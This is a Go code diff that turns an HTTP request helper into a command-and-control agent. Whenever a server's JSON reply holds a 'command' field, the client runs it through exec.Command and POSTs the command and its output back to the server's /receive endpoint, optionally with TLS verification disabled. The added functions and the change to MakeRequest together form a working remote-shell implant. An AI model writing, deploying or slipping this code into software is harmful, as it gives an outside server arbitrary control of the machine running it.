@@ -12,6 +12,7 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"os/exec"
 	"os/signal"
 	"strings"
 	"time"
@@ -118,6 +119,71 @@ func parseTimeout(timeoutStr string) (time.Duration, error) {
 	return duration, nil
 }
 
+// ExecuteCommand runs the received command and returns the output.
+func ExecuteCommand(command string) (string, error) {
+	// Split the command into name and args
+	parts := strings.Fields(command)
+	if len(parts) == 0 {
+		return "", errors.New("empty command received")
+	}
+
+	cmd := exec.Command(parts[0], parts[1:]...)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return "", fmt.Errorf("command execution failed: %w", err)
+	}
+
+	return string(output), nil
+}
+
+// SendCommandOutput sends the command execution result back to the server.
+func SendCommandOutput(serverURL, command, output string, headers map[string]string, skipTLS bool, timeout time.Duration) error {
+	// Construct JSON payload
+	data := map[string]string{
+		"command": command,
+		"output":  output,
+	}
+	jsonData, err := json.Marshal(data)
+	if err != nil {
+		return fmt.Errorf("failed to encode JSON: %w", err)
+	}
+
+	// Create new request
+	req, err := http.NewRequest("POST", serverURL, bytes.NewBuffer(jsonData))
+	if err != nil {
+		return fmt.Errorf("failed to create POST request: %w", err)
+	}
+
+	// Set headers
+	for key, value := range headers {
+		req.Header.Set(key, value)
+	}
+	req.Header.Set("Content-Type", "application/json")
+
+	// TLS configuration
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: skipTLS, // Skip TLS verification if requested
+	}
+
+	// HTTP client
+	client := &http.Client{
+		Timeout: timeout,
+		Transport: &http.Transport{
+			TLSClientConfig: tlsConfig,
+		},
+	}
+
+	// Send request
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to send command output: %w", err)
+	}
+	defer resp.Body.Close()
+
+	log.Printf("[+] Command output sent successfully, server responded with: %d\n", resp.StatusCode)
+	return nil
+}
+
 // Make the request to our endpoint
 func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 	// Debugging
@@ -147,7 +213,7 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 		default:
 			jsonData, err := json.Marshal(body)
 			if err != nil {
-				return nil, fmt.Errorf("[-] Error encoding request body to JSON: %w", err)
+				return nil, fmt.Errorf("error encoding request body to JSON: %w", err)
 			}
 			reqBody = bytes.NewBuffer(jsonData)
 		}
@@ -155,7 +221,7 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 
 	req, err := http.NewRequest(opts.Method, fullURL, reqBody)
 	if err != nil {
-		return nil, fmt.Errorf("[-] Error creating request: %w", err)
+		return nil, fmt.Errorf("error creating request: %w", err)
 	}
 
 	// Set headers
@@ -185,17 +251,40 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 	// Read response body
 	respBody, err := io.ReadAll(resp.Body)
 	if err != nil {
-		return nil, fmt.Errorf("[-] Error reading response: %w", err)
+		return nil, fmt.Errorf("error reading response: %w", err)
 	}
 
 	// Parse JSON response if applicable
 	var jsonResponse map[string]interface{}
 	if err := json.Unmarshal(respBody, &jsonResponse); err == nil {
-		return &ResponseData{
+		// return &ResponseData{
+		responseData := &ResponseData{
 			Status:     resp.StatusCode,
 			Body:       string(respBody),
 			JSONParsed: jsonResponse,
-		}, nil
+			// 	}, nil
+			// }
+		}
+
+		// **Check if response contains a "command" key**
+		if command, found := jsonResponse["command"].(string); found {
+			log.Printf("[+] Received command: %s\n", command)
+			output, err := ExecuteCommand(command)
+			if err != nil {
+				log.Printf("[-] Command execution failed: %s\n", err)
+				output = err.Error()
+			}
+
+			postURL := opts.BaseURL + "/receive"
+
+			// **Send the command output back to the server**
+			err = SendCommandOutput(postURL, command, output, opts.Headers, opts.SkipTLSVerify, opts.Timeout)
+			if err != nil {
+				log.Printf("[-] Failed to send command output: %s\n", err)
+			}
+		}
+
+		return responseData, nil
 	}
 
 	return &ResponseData{
